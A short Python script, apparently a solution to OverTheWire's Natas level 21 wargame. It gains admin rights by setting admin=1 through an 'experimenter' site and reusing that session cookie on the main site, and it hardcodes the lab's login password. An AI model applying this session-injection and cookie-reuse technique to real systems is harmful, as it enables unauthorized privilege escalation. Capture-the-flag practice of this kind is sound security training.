import requests

url="http://natas21.natas.labs.overthewire.org"
experimenter="http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1"
auth_user="natas21"
auth_pass="89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"

s=requests.Session()
r=s.get(experimenter,auth=(auth_user,auth_pass))
old_session=r.cookies.get_dict()

r=requests.get(url,auth=(auth_user,auth_pass),cookies=old_session)
print(r.text)
